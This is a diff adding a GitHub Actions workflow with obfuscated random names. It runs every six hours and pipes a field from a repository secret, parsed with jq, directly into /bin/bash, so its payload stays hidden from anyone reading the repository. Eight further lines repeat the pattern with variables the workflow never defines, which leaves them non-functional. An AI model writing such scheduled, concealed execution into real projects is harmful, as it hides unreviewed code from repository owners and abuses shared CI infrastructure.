@@ -1,0 +1,26 @@
+name: fanqiwei6121
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanqiwei6121
+        env:
+          vq0: ${{ secrets.vq0 }}
+        run: |
+          echo $vq0 | jq -r .jcj250 | /bin/bash
+          echo $n3 | jq -r .alatt9 | /bin/bash
+          echo $fefbi61159 | jq -r .dv2994 | /bin/bash
+          echo $dca01550 | jq -r .n5770 | /bin/bash
+          echo $wgejc12 | jq -r .a19 | /bin/bash
+          echo $ozsy9 | jq -r .ppl9 | /bin/bash
+          echo $ml339 | jq -r .gyx5 | /bin/bash
+          echo $jnp005 | jq -r .pddi88192 | /bin/bash
+          echo $fr41 | jq -r .yt7635 | /bin/bash
+
